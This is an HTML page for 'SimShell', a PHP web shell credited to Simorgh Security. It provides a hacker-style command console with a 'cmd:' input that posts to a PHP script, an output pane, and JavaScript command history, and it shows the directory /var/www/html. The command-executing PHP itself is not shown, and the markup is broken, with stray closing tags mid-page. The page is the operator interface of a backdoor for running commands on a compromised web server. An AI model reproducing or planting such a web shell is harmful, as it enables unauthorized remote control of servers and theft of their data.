<?xml version="1.0" encoding="UTF-8"?>

<head>
  <title>SimShell - Simorgh Security MGZ</title>
  <link rel="stylesheet" href="Simshell.css" type="text/css" />

  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array("");
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

  </script>
</head>

<body   onload="init()" style="color: #00FF00; background-color: #000000">

<span style="background-color: #000000">



</body>

</body>
</html>



</span>



<p><span style="background-color: #000000">&nbsp;Directory: </span> <code>
<span style="background-color: #000000">/var/www/html</span></code></p>

<form name="shell" action="/SimShell 1.0 - Simorgh Security MGZ.php" method="post">
<div style="width: 900; height: 454">
<textarea name="output" readonly="readonly" cols="120" rows="20" style="color: #CCFF33; border: 1px dashed #FF0000; background-color: #000000">
</textarea>
<p class="prompt" align="justify">
  cmd:<input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="60" tabindex="1" style="border: 1px dotted #808080">
  <input type="submit" value="Enter" /><input type="submit" name="reset" value="Reset" /> Rows: 
  <input type="text" name="rows" value="" size="5" />
</p>
<p class="prompt" align="center">
  <br>
  <br>
&nbsp;<font color="#C0C0C0" size="2">Copyright 2004-Simorgh Security<br>
  Make On PhpShell Kernel<br>
  <a href="http://www.simorgh-ev.com" style="text-decoration: none">
  <font color="#C0C0C0">www.simorgh-ev.com</font></a></font></p>
</div>
</form>


</html>